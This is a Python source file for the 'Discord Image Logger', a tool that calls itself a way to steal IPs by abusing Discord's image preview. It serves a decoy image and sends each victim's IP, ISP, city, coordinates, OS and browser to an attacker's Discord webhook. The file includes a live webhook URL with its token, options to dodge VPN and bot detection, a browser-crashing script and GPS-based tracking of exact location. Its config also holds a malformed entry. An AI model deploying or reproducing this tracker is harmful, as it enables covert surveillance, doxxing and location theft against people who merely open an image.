# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1334735857361620992/gglyQrIF5oKyH_cf2UM77kFtDqNJqzeHPirhH3VEt0Mq8G8eM2ycHG4fwo8AJMH6a_MS",
    "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
